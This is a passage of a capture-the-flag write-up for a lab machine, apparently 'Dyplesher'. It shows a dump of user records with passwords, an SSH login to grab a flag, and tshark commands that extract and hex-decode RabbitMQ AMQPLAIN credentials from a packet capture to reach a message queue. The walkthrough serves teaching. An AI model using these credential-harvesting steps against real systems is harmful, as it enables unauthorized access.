class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;mckenzie.hanna@gmail.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;635 Brenna Highway</span><span class=se>\n</span><span class=s2>Gracietown, LA 91067&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;WVXsGShbMH8q&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Ms. Earlene Walker II&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;nannie.osinski@stroman.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;937 Pamela Summit Suite 176</span><span class=se>\n</span><span class=s2>North Marilyne, NY 81843-6436&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;WVXsGShbMH8q&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Murphy Runolfsdottir&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;kailey.schmeler@koelpin.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;904 Weber Radial Apt. 285</span><span class=se>\n</span><span class=s2>New Carmine, MO 27520-2820&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;WVXsGShbMH8q&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Pete Littel DVM&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;shanon.vandervort@schultz.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;7319 Emanuel Stream Suite 632</span><span class=se>\n</span><span class=s2>West Lamonttown, WY 40093-3120&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Prof. Francisco Kunde Jr.&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;hank42@hotmail.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;376 Keon Turnpike Suite 065</span><span class=se>\n</span><span class=s2>West Jeffery, MA 50951-0757&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Prof. Leilani Effertz&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;thansen@yahoo.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;720 Halvorson Crossroad Apt. 108</span><span class=se>\n</span><span class=s2>Kubshire, PA 20697&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Prof. Shanel Quigley IV&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;johnson.golda@treutel.biz&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;131 Marguerite Plain Suite 250</span><span class=se>\n</span><span class=s2>East Unique, AK 87442&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;DS3Tgljvn4Eu&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Prof. Sylvester Macejkovic&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;vgreenholt@herzog.org&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;741 Delfina Canyon Suite 380</span><span class=se>\n</span><span class=s2>Port Kimberlyfort, OK 57900&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Prof. Zackery Labadie MD&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;natasha68@kertzmann.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;52379 Alvina Landing</span><span class=se>\n</span><span class=s2>Weimanntown, KY 07869-5622&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Raymond Krajcik&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;obradtke@gmail.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;638 Kozey Cape Apt. 329</span><span class=se>\n</span><span class=s2>South Ignacio, WV 94812&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Roy Sipes&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;skulas@wolf.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;808 Grimes Keys</span><span class=se>\n</span><span class=s2>West Abe, IA 34906-1613&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;WVXsGShbMH8q&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Warren Kutch MD&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;jeffery69@gmail.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;2759 Teagan Mission Apt. 736</span><span class=se>\n</span><span class=s2>Kristinfurt, AR 21528-3615&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Yazmin Connelly I&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;cullen72@kunde.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;9625 Amari Centers Suite 611</span><span class=se>\n</span><span class=s2>Predovicport, CT 24073-1889&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;U3aWxNj9Cvnz&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;Yazmin Hermann&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;sage.hansen@erdman.com&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;83420 General Manor Suite 115</span><span class=se>\n</span><span class=s2>Koelpinfurt, AK 63347-8782&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;WVXsGShbMH8q&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;felamos&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;felamos@dyplesher.htb&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;India&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;tieb0graQueg&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;yuntao&#34;</span><span class=p>,</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=s2>&#34;yuntao@dyplesher.htb&#34;</span><span class=p>,</span><span class=s2>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;Italy&#34;</span><span class=p>,</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=s2>&#34;wagthAw4ob&#34;</span><span class=p>,</span><span class=s2>&#34;subscribed&#34;</span><span class=p>:</span><span class=bp>true</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>There are a lot of accounts we don&rsquo;t care about but some are familiars:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;MinatoTW&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;email&#34;</span><span class=p>:</span> <span class=s2>&#34;MinatoTW@dyplesher.htb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;address&#34;</span><span class=p>:</span> <span class=s2>&#34;India&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;bihys1amFov&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;subscribed&#34;</span><span class=p>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl><span class=p>}{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;felamos&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;email&#34;</span><span class=p>:</span> <span class=s2>&#34;felamos@dyplesher.htb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;address&#34;</span><span class=p>:</span> <span class=s2>&#34;India&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;tieb0graQueg&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;subscribed&#34;</span><span class=p>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl><span class=p>}{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;yuntao&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;email&#34;</span><span class=p>:</span> <span class=s2>&#34;yuntao@dyplesher.htb&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;address&#34;</span><span class=p>:</span> <span class=s2>&#34;Italy&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;wagthAw4ob&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;subscribed&#34;</span><span class=p>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>If we connect to felamos account via SSH we can find the user flag in its user directory.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ felamos@dyplesher:~$ cat user.txt
</span></span><span class=line><span class=cl>cf35f5276f3646c8838c6e4c5267ea52
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--from-felamos-to-root>Privilege Escalation of Machine : from felamos to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-felamos-to-root>#</a></h2><p>We already listened to AMQP server but we have even more clues that we need to
continue that way.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>felamos@dyplesher:~$ cat yuntao/send.sh
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;Hey yuntao, Please publish all cuberite plugins created by players on plugin_data &#34;Exchange&#34; and &#34;Queue&#34;. Just send url to download plugins and our new code will review it and working plugins will be added to the server.&#39;</span> &gt;  /dev/pts/<span class=o>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>felamos@dyplesher:~$ ps -ef f <span class=p>|</span> grep mq
</span></span><span class=line><span class=cl>rabbitmq   <span class=m>901</span>     <span class=m>1</span>  <span class=m>0</span> 06:47 ?        Ss     0:00 /bin/sh /usr/sbin/rabbitmq-server
</span></span><span class=line><span class=cl>rabbitmq  <span class=m>1003</span>   <span class=m>901</span>  <span class=m>0</span> 06:47 ?        Sl     1:45  <span class=se>\_</span> /usr/lib/erlang/erts-10.4.4/bin/beam.smp -W w -A <span class=m>64</span> -MBas ageffcbf -MHas ageffcbf -MBlmbcs <span class=m>512</span> -MHlmbcs <span class=m>512</span> -MMmcs <span class=m>30</span> -P <span class=m>1048576</span> -t <span class=m>5000000</span> -stbt db -zdbbl <span class=m>128000</span> -K <span class=nb>true</span> -- -root /usr/lib/erlang -progname erl -- -home /var/lib/rabbitmq -- -pa /usr/lib/rabbitmq/lib/rabbitmq_server-3.7.8/ebin -noshell -noinput -s rabbit boot -sname rabbit@dyplesher -boot start_sasl -kernel inet_default_connect_options <span class=o>[{</span>nodelay,true<span class=o>}]</span> -sasl errlog_type error -sasl sasl_error_logger <span class=nb>false</span> -rabbit lager_log_root <span class=s2>&#34;/var/log/rabbitmq&#34;</span> -rabbit lager_default_file <span class=s2>&#34;/var/log/rabbitmq/rabbit@dyplesher.log&#34;</span> -rabbit lager_upgrade_file <span class=s2>&#34;/var/log/rabbitmq/rabbit@dyplesher_upgrade.log&#34;</span> -rabbit enabled_plugins_file <span class=s2>&#34;/etc/rabbitmq/enabled_plugins&#34;</span> -rabbit plugins_dir <span class=s2>&#34;/usr/lib/rabbitmq/plugins:/usr/lib/rabbitmq/lib/rabbitmq_server-3.7.8/plugins&#34;</span> -rabbit plugins_expand_dir <span class=s2>&#34;/var/lib/rabbitmq/mnesia/rabbit@dyplesher-plugins-expand&#34;</span> -os_mon start_cpu_sup <span class=nb>false</span> -os_mon start_disksup <span class=nb>false</span> -os_mon start_memsup <span class=nb>false</span> -mnesia dir <span class=s2>&#34;/var/lib/rabbitmq/mnesia/rabbit@dyplesher&#34;</span> -kernel inet_dist_listen_min <span class=m>25672</span> -kernel inet_dist_listen_max <span class=m>25672</span>
</span></span><span class=line><span class=cl>rabbitmq  <span class=m>2050</span>  <span class=m>1003</span>  <span class=m>0</span> 06:47 ?        Ss     0:01      <span class=se>\_</span> erl_child_setup <span class=m>65536</span>
</span></span><span class=line><span class=cl>rabbitmq  <span class=m>2070</span>  <span class=m>2050</span>  <span class=m>0</span> 06:47 ?        Ss     0:00          <span class=se>\_</span> inet_gethost <span class=m>4</span>
</span></span><span class=line><span class=cl>rabbitmq  <span class=m>2071</span>  <span class=m>2070</span>  <span class=m>0</span> 06:47 ?        S      0:00              <span class=se>\_</span> inet_gethost <span class=m>4</span>
</span></span></code></pre></td></tr></table></div></div><p>It seems we need to send a link via AMQP and something will download it.</p><p>There is an awesome easy AMQP client in ruby: <a href=https://github.com/ruby-amqp/bunny>Bunny</a>.
There is also a <a href=https://www.rabbitmq.com/tutorials/tutorial-three-ruby.html>RabbitMQ tutorial</a>
giving examples for our use case with exactly this library.</p><p>So let&rsquo;s download the script in the example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ wget https://github.com/rabbitmq/rabbitmq-tutorials/raw/master/ruby/emit_log.rb
</span></span><span class=line><span class=cl>$ gem install bunny
</span></span><span class=line><span class=cl>$ cp emit_log.rb amqp.rb
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s copy the example an modify it in something useable. Ready the doc to
connect to a remote server rather than localhost.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;bunny&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>options</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=ss>host</span><span class=p>:</span> <span class=s1>&#39;10.10.10.190&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>port</span><span class=p>:</span> <span class=mi>5672</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>connection</span> <span class=o>=</span> <span class=no>Bunny</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>channel</span> <span class=o>=</span> <span class=n>connection</span><span class=o>.</span><span class=n>create_channel</span>
</span></span><span class=line><span class=cl><span class=n>exchange</span> <span class=o>=</span> <span class=n>channel</span><span class=o>.</span><span class=n>fanout</span><span class=p>(</span><span class=s1>&#39;logs&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=o>=</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>empty?</span> <span class=p>?</span> <span class=s1>&#39;Hello World!&#39;</span> <span class=p>:</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exchange</span><span class=o>.</span><span class=n>publish</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34; [x] Sent </span><span class=si>#{</span><span class=n>message</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>close</span>
</span></span></code></pre></td></tr></table></div></div><p>But when trying to connect we have an access refused, we need credentials.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl>E, [2020-10-01T22:23:44.225632 #116412] ERROR -- #&lt;Bunny::Session:0x460 guest@10.10.10.190:5672, vhost=/, addresses=[10.10.10.190:5672]&gt;: Authentication with RabbitMQ failed: 403 ACCESS_REFUSED - Login was refused using authentication mechanism PLAIN. For details see the broker logfile.
</span></span><span class=line><span class=cl>Traceback (most recent call last):
</span></span><span class=line><span class=cl>        2: from amqp.rb:10:in `&lt;main&gt;&#39;
</span></span><span class=line><span class=cl>        1: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/session.rb:325:in `start&#39;
</span></span><span class=line><span class=cl>/home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/session.rb:1216:in `open_connection&#39;: Authentication with RabbitMQ failed. Please check your connection settings. Username: guest, vhost: /, password length: 5 (Bunny::AuthenticationFailureError
</span></span></code></pre></td></tr></table></div></div><p>Since it&rsquo;s using PLAIN &ldquo;cipher&rdquo; we shoudl be able to see the creds in cleartext
in our pcap.</p><p>So let&rsquo;s go with tshark again.</p><p>Reading <a href=https://www.rabbitmq.com/resources/specs/amqp-xml-doc0-9-1.pdf>amqp specs</a>,
we can see that method <code>start-ok</code> (id 11) description is:</p><blockquote><p>select security mechanism and locale</p></blockquote><p>So this filter should help filter <code>start-ok</code> message only:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ tshark -r cyfun.pcap -Y &#39;amqp.method.method == 11&#39;
</span></span></code></pre></td></tr></table></div></div><p>Then we can see there are only 4 <a href=https://www.rabbitmq.com/access-control.html#available-mechanisms>Built-in Authentication Mechanisms</a>
including <code>PLAIN</code> and <code>AMQPLAIN</code>.</p><blockquote><p><strong>PLAIN</strong> - SASL PLAIN authentication. This is enabled by default in the RabbitMQ server and clients, and is the default for most other clients.</p><p><strong>AMQPLAIN</strong> - Non-standard version of PLAIN retained for backwards compatibility. This is enabled by default in the RabbitMQ server.</p></blockquote><p>We have nothing filtering with PLAIN so it must use AMQPLAIN.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ tshark -r cyfun.pcap -Y &#39;amqp.method.method == 11 &amp;&amp; amqp.method.arguments.mechanism == &#34;AMQPLAIN&#34;&#39;
</span></span><span class=line><span class=cl>   90  14.547178    127.0.0.1 氓 127.0.0.1    AMQP 391 Connection.Start-Ok
</span></span><span class=line><span class=cl>  349 134.658074    127.0.0.1 氓 127.0.0.1    AMQP 391 Connection.Start-Ok
</span></span><span class=line><span class=cl>  610 254.771318    127.0.0.1 氓 127.0.0.1    AMQP 391 Connection.Start-Ok
</span></span><span class=line><span class=cl>  872 374.913294    127.0.0.1 氓 127.0.0.1    AMQP 391 Connection.Start-Ok
</span></span></code></pre></td></tr></table></div></div><p>So now let&rsquo;s extract the reponse that should contains the crendtials used to log in.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ tshark -r cyfun.pcap -Y &#39;amqp.method.method == 11 &amp;&amp; amqp.method.arguments.mechanism == &#34;AMQPLAIN&#34;&#39; -T fields -e amqp.method.arguments.response | sort -u
</span></span><span class=line><span class=cl>054c4f47494e530000000679756e74616f0850415353574f5244530000000d45617368416e69634f63334f70
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s decode the hexadecimal manually because <code>xxd -r -p</code> will not display non
printable characters and strip half of what we need.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>irb</span>
</span></span><span class=line><span class=cl><span class=n>irb</span><span class=p>(</span><span class=n>main</span><span class=p>):</span><span class=mo>001</span><span class=p>:</span><span class=mi>0</span><span class=o>&gt;</span> <span class=nb>require</span> <span class=s1>&#39;ctf_party&#39;</span>
</span></span><span class=line><span class=cl><span class=o>=&gt;</span> <span class=kp>true</span>
</span></span><span class=line><span class=cl><span class=n>irb</span><span class=p>(</span><span class=n>main</span><span class=p>):</span><span class=mo>002</span><span class=p>:</span><span class=mi>0</span><span class=o>&gt;</span> <span class=s1>&#39;054c4f47494e530000000679756e74616f0850415353574f5244530000000d45617368416e69634f63334f70&#39;</span><span class=o>.</span><span class=n>from_hex</span>
</span></span><span class=line><span class=cl><span class=o>=&gt;</span> <span class=s2>&#34;</span><span class=se>\x05</span><span class=s2>LOGINS</span><span class=se>\x00\x00\x00\x06</span><span class=s2>yuntao</span><span class=se>\b</span><span class=s2>PASSWORDS</span><span class=se>\x00\x00\x00\r</span><span class=s2>EashAnicOc3Op&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>We have of course other ways to do:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ rax2 -s 054c4f47494e530000000679756e74616f0850415353574f5244530000000d45617368416e69634f63334f70 | xxd
</span></span><span class=line><span class=cl>00000000: 054c 4f47 494e 5300 0000 0679 756e 7461  .LOGINS....yunta
</span></span><span class=line><span class=cl>00000010: 6f08 5041 5353 574f 5244 5300 0000 0d45  o.PASSWORDS....E
</span></span><span class=line><span class=cl>00000020: 6173 6841 6e69 634f 6333 4f70            ashAnicOc3O
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ tshark -r cyfun.pcap -Y &#39;amqp.method.method == 11 &amp;&amp; amqp.method.arguments.mechanism == &#34;AMQPLAIN&#34;&#39; -T fields -e amqp.method.arguments.response | sort -u | xxd -r -p | xxd
</span></span><span class=line><span class=cl>00000000: 054c 4f47 494e 5300 0000 0679 756e 7461  .LOGINS....yunta
</span></span><span class=line><span class=cl>00000010: 6f08 5041 5353 574f 5244 5300 0000 0d45  o.PASSWORDS....E
</span></span><span class=line><span class=cl>00000020: 6173 6841 6e69 634f 6333 4f70            ashAnicOc3Op
